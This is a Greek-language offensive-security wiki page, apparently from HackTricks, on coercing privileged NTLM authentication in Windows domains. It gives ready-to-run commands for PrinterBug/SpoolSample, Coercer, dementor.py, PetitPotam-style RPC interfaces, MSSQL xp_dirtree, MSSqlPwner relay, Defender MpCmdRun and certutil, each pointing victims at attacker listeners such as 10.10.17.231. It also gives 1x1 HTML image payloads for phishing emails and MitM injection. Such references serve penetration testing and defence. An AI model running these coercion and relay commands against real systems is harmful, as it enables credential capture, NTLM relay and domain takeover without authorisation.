# Επιβολή Privileged Authentication μέσω NTLM

{{#include ../../banners/hacktricks-training.md}}

## SharpSystemTriggers

Το [**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) είναι μια **συλλογή** από **remote authentication triggers**, γραμμένα σε C# με χρήση του MIDL compiler, ώστε να αποφεύγονται dependencies τρίτων.

## Spooler Service Abuse

Εάν η υπηρεσία _**Print Spooler**_ είναι **ενεργοποιημένη,** μπορείτε να χρησιμοποιήσετε ήδη γνωστά AD credentials για να **ζητήσετε** από τον print server του Domain Controller μια **ενημέρωση** σχετικά με νέες εργασίες εκτύπωσης και απλώς να του υποδείξετε να **στείλει την ειδοποίηση σε κάποιο σύστημα**.\
Σημειώστε ότι όταν ο printer στέλνει την ειδοποίηση σε αυθαίρετα συστήματα, πρέπει να **κάνει authenticate σε** αυτό το **σύστημα**. Επομένως, ένας attacker μπορεί να κάνει την υπηρεσία _**Print Spooler**_ να κάνει authenticate σε ένα αυθαίρετο σύστημα, και η υπηρεσία θα **χρησιμοποιήσει το computer account** σε αυτό το authentication.

Κάτω από το επίπεδο υλοποίησης, το κλασικό **PrinterBug** primitive κάνει abuse του **`RpcRemoteFindFirstPrinterChangeNotificationEx`** μέσω του **`\\PIPE\\spoolss`**. Ο attacker αρχικά ανοίγει ένα printer/server handle και στη συνέχεια παρέχει ένα fake client name στο `pszLocalMachine`, ώστε ο target spooler να δημιουργήσει ένα notification channel **πίσω προς το host που ελέγχει ο attacker**. Αυτός είναι ο λόγος για τον οποίο το αποτέλεσμα είναι **outbound authentication coercion** και όχι άμεση εκτέλεση κώδικα.<sup>[[2]](#references)</sup>\
Εάν αναζητάτε **RCE/LPE** στον ίδιο τον spooler, ελέγξτε το [PrintNightmare](printnightmare.md). Αυτή η σελίδα εστιάζει σε **coercion και relay**.

### Εύρεση Windows Servers στο domain

Χρησιμοποιώντας PowerShell, λάβετε μια λίστα με Windows boxes. Οι servers έχουν συνήθως προτεραιότητα, οπότε ας επικεντρωθούμε σε αυτούς:
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### Εντοπισμός υπηρεσιών Spooler σε κατάσταση listening

Χρησιμοποιώντας μια ελαφρώς τροποποιημένη έκδοση του [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket) του @mysmartlogin (Vincent Le Toux), ελέγξτε αν η Spooler Service κάνει listening:
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
Μπορείτε επίσης να χρησιμοποιήσετε το `rpcdump.py` σε Linux και να αναζητήσετε το protocol **MS-RPRN**:
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
Ή δοκιμάστε γρήγορα hosts από Linux με **NetExec/CrackMapExec**:
```bash
nxc smb targets.txt -u user -p password -M spooler
```
Αν θέλετε να **απαριθμήσετε τις επιφάνειες coercion** αντί να ελέγξετε απλώς αν υπάρχει το endpoint του spooler, χρησιμοποιήστε το **Coercer scan mode**:<sup>[[5]](#references)</sup>
```bash
coercer scan -u user -p password -d domain -t TARGET --filter-protocol-name MS-RPRN
coercer scan -u user -p password -d domain -t TARGET --filter-pipe-name spoolss
```
Αυτό είναι χρήσιμο, επειδή η εμφάνιση του endpoint στο EPM δείχνει μόνο ότι το print RPC interface είναι καταχωρισμένο. **Δεν** εγγυάται ότι κάθε coercion method είναι προσβάσιμη με τα τρέχοντα δικαιώματά σας ή ότι ο host θα δημιουργήσει μια αξιοποιήσιμη ροή authentication.

### Ζητήστε από την υπηρεσία να πραγματοποιήσει authentication σε έναν αυθαίρετο host

Μπορείτε να κάνετε compile το [SpoolSample από εδώ](https://github.com/NotMedic/NetNTLMtoSilverTicket).
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
ή χρησιμοποιήστε το [**dementor.py του 3xocyte**](https://github.com/NotMedic/NetNTLMtoSilverTicket) ή το [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) αν χρησιμοποιείτε Linux
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
Με το **Coercer**, μπορείτε να στοχεύσετε απευθείας τις διεπαφές του spooler και να αποφύγετε τις εικασίες σχετικά με το ποια μέθοδος RPC είναι εκτεθειμένη:<sup>[[5]](#references)</sup>
```bash
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-protocol-name MS-RPRN
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-method-name RpcRemoteFindFirstPrinterChangeNotificationEx
```
### Εξαναγκασμός HTTP αντί για SMB με WebClient

Το κλασικό PrinterBug συνήθως προκαλεί **SMB** authentication προς `\\attacker\share`, κάτι που παραμένει χρήσιμο για **capture**, **relay σε HTTP targets** ή **relay όπου απουσιάζει το SMB signing**.\
Ωστόσο, σε σύγχρονα περιβάλλοντα, το **SMB σε SMB** relay συχνά μπλοκάρεται από το **SMB signing**, επομένως οι operators συχνά προτιμούν να εξαναγκάζουν authentication μέσω **HTTP/WebDAV**.

Αν στο target εκτελείται η υπηρεσία **WebClient**, το listener μπορεί να καθοριστεί με μορφή που κάνει τα Windows να χρησιμοποιήσουν **WebDAV μέσω HTTP**:
```bash
printerbug.py 'domain/username:password'@TARGET 'ATTACKER@80/share'
coercer coerce -u user -p password -d domain -t TARGET -l ATTACKER --http-port 80 --filter-protocol-name MS-RPRN
```
Αυτό είναι ιδιαίτερα χρήσιμο όταν γίνεται chaining με **`ntlmrelayx --adcs`** ή άλλους HTTP relay targets, επειδή αποφεύγεται η εξάρτηση από τη δυνατότητα SMB relay στη coerced σύνδεση. Η σημαντική προϋπόθεση είναι ότι το **WebClient πρέπει να εκτελείται** στο victim, ώστε να λειτουργεί η παραλλαγή HTTP/WebDAV.

### Συνδυασμός με Unconstrained Delegation

Αν ένας attacker έχει ήδη παραβιάσει έναν computer με [Unconstrained Delegation](unconstrained-delegation.md), μπορεί να **κάνει τον printer να πραγματοποιήσει authentication σε αυτόν τον computer**. Λόγω του unconstrained delegation, το **TGT** του **computer account του printer** θα **αποθηκευτεί στη** **μνήμη** του computer με unconstrained delegation. Εφόσον ο attacker έχει ήδη παραβιάσει αυτό το host, θα μπορεί να **ανακτήσει αυτό το ticket** και να το κάνει abuse ([Pass the Ticket](pass-the-ticket.md)).

## RPC Force authentication

[Coercer](https://github.com/p0dalirius/Coercer)

### RPC UNC-path coercion matrix (interfaces/opnums που προκαλούν outbound auth)
- MS-RPRN (Print System Remote Protocol)
- Pipe: \\PIPE\\spoolss
- IF UUID: 12345678-1234-abcd-ef00-0123456789ab
- Opnums: 62 RpcRemoteFindFirstPrinterChangeNotification; 65 RpcRemoteFindFirstPrinterChangeNotificationEx
- Tools: PrinterBug / SpoolSample / Coercer<sup>[[1]](#references)[[6]](#references)</sup>
- MS-PAR (Print System Asynchronous Remote)
- Pipe: \\PIPE\\spoolss
- IF UUID: 76f03f96-cdfd-44fc-a22c-64950a001209
- Notes: asynchronous print interface στο ίδιο spooler pipe· χρησιμοποιήστε το Coercer για να απαριθμήσετε τις προσβάσιμες μεθόδους σε ένα δεδομένο host<sup>[[1]](#references)[[6]](#references)</sup>
- MS-EFSR (Encrypting File System Remote Protocol)
- Pipes: \\PIPE\\efsrpc (επίσης μέσω των \\PIPE\\lsarpc, \\PIPE\\samr, \\PIPE\\lsass, \\PIPE\\netlogon)
- IF UUIDs: c681d488-d850-11d0-8c52-00c04fd90f7e ; df1941c5-fe89-4e79-bf10-463657acf44d
- Opnums που γίνονται συχνά abuse: 0, 4, 5, 6, 7, 12, 13, 15, 16
- Tool: PetitPotam<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>
- MS-DFSNM (DFS Namespace Management)
- Pipe: \\PIPE\\netdfs
- IF UUID: 4fc742e0-4a10-11cf-8273-00aa004ae673
- Opnums: 12 NetrDfsAddStdRoot; 13 NetrDfsRemoveStdRoot
- Tool: DFSCoerce<sup>[[1]](#references)[[6]](#references)[[8]](#references)</sup>
- MS-FSRVP (File Server Remote VSS)
- Pipe: \\PIPE\\FssagentRpc
- IF UUID: a8e0653c-2744-4389-a61d-7373df8b2292
- Opnums: 8 IsPathSupported; 9 IsPathShadowCopied
- Tool: ShadowCoerce<sup>[[1]](#references)[[6]](#references)[[9]](#references)</sup>
- MS-EVEN (EventLog Remoting)
- Pipe: \\PIPE\\even
- IF UUID: 82273fdc-e32a-18c3-3f78-827929dc23ea
- Opnum: 9 ElfrOpenBELW
- Tool: CheeseOunce<sup>[[1]](#references)</sup>

Σημείωση: Αυτές οι μέθοδοι δέχονται παραμέτρους που μπορούν να μεταφέρουν ένα UNC path (π.χ. `\\attacker\share`). Κατά την επεξεργασία τους, τα Windows πραγματοποιούν authentication (στο πλαίσιο machine/user) σε αυτό το UNC, επιτρέποντας NetNTLM capture ή relay.\
Για spooler abuse, το **MS-RPRN opnum 65** παραμένει το πιο συνηθισμένο και καλύτερα τεκμηριωμένο primitive, επειδή η προδιαγραφή του protocol δηλώνει ρητά ότι ο server δημιουργεί ένα notification channel πίσω προς τον client που καθορίζεται από το `pszLocalMachine`.<sup>[[2]](#references)</sup>

### MS-EVEN: ElfrOpenBELW (opnum 9) coercion
- Interface: MS-EVEN μέσω \\PIPE\\even (IF UUID 82273fdc-e32a-18c3-3f78-827929dc23ea)<sup>[[3]](#references)</sup>
- Call signature: ElfrOpenBELW(UNCServerName, BackupFileName="\\\\attacker\\share\\backup.evt", MajorVersion=1, MinorVersion=1, LogHandle)<sup>[[4]](#references)</sup>
- Effect: το target επιχειρεί να ανοίξει το παρεχόμενο backup log path και πραγματοποιεί authentication στο UNC που ελέγχει ο attacker.<sup>[[1]](#references)</sup>
- Practical use: coercion Tier 0 assets (DC/RODC/Citrix/etc.) ώστε να εκπέμψουν NetNTLM και, στη συνέχεια, relay σε AD CS endpoints (σενάρια ESC8/ESC11) ή σε άλλες privileged services.<sup>[[1]](#references)</sup>

## PrivExchange

Η επίθεση `PrivExchange` είναι αποτέλεσμα ενός flaw που εντοπίστηκε στο **Exchange Server `PushSubscription` feature**. Αυτό το feature επιτρέπει στον Exchange server να εξαναγκαστεί από οποιονδήποτε domain user διαθέτει mailbox να πραγματοποιήσει authentication σε οποιοδήποτε host παρέχεται από τον client μέσω HTTP.

Από προεπιλογή, το **Exchange service εκτελείται ως SYSTEM** και διαθέτει υπερβολικά privileges (συγκεκριμένα, έχει **WriteDacl privileges στο domain πριν από το 2019 Cumulative Update**). Αυτό το flaw μπορεί να γίνει abuse για να ενεργοποιηθεί το **relaying πληροφοριών προς LDAP και, στη συνέχεια, να εξαχθεί η domain NTDS database**. Σε περιπτώσεις όπου το relay προς LDAP δεν είναι δυνατό, αυτό το flaw μπορεί ακόμη να χρησιμοποιηθεί για relay και authentication σε άλλους hosts μέσα στο domain. Η επιτυχής εκμετάλλευση αυτής της επίθεσης παρέχει άμεση πρόσβαση στον Domain Admin με οποιοδήποτε authenticated domain user account.

## Μέσα στα Windows

Αν βρίσκεστε ήδη μέσα στο Windows machine, μπορείτε να εξαναγκάσετε τα Windows να συνδεθούν σε έναν server χρησιμοποιώντας privileged accounts με:

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
```shell
# Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
```
Ή χρησιμοποιήστε αυτήν την άλλη technique: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

Είναι δυνατό να χρησιμοποιήσετε το certutil.exe lolbin (binary υπογεγραμμένο από τη Microsoft) για να προκαλέσετε NTLM authentication:
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## HTML injection

### Μέσω email

Αν γνωρίζεις τη **διεύθυνση email** του χρήστη που κάνει login σε ένα machine που θέλεις να παραβιάσεις, μπορείς απλώς να του στείλεις ένα **email με μια εικόνα 1x1** όπως
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
και όταν το ανοίξει, θα προσπαθήσει να κάνει authenticate.

### MitM

Αν μπορείτε να πραγματοποιήσετε μια επίθεση MitM σε έναν υπολογιστή και να εισάγετε HTML σε μια σελίδα που θα δει ο χρήστης, θα μπορούσατε να δοκιμάσετε να εισάγετε μια εικόνα όπως η παρακάτω στη σελίδα:
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## Άλλοι τρόποι εξαναγκασμού και phishing για NTLM authentication


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

## Cracking NTLMv1

Αν μπορείτε να κάνετε capture [NTLMv1 challenges, διαβάστε εδώ πώς να τα κάνετε crack](../ntlm/index.html#ntlmv1-attack).\
_Να θυμάστε ότι, για να κάνετε crack το NTLMv1, πρέπει να ορίσετε το Responder challenge σε "1122334455667788"_

## References

- [1] [Unit 42 – Authentication Coercion Keeps Evolving](https://unit42.paloaltonetworks.com/authentication-coercion/)
- [2] [Microsoft – MS-RPRN: RpcRemoteFindFirstPrinterChangeNotificationEx (Opnum 65)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/eb66b221-1c1f-4249-b8bc-c5befec2314d)
- [3] [Microsoft – MS-EVEN: EventLog Remoting Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f)
- [4] [Microsoft – MS-EVEN: ElfrOpenBELW (Opnum 9)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/4db1601c-7bc2-4d5c-8375-c58a6f8fc7e1)
- [5] [p0dalirius – Coercer](https://github.com/p0dalirius/Coercer)
- [6] [p0dalirius – windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
- [7] [PetitPotam (MS-EFSR)](https://github.com/topotam/PetitPotam)
- [8] [DFSCoerce (MS-DFSNM)](https://github.com/Wh04m1001/DFSCoerce)
- [9] [ShadowCoerce (MS-FSRVP)](https://github.com/ShutdownRepo/ShadowCoerce)

{{#include ../../banners/hacktricks-training.md}}
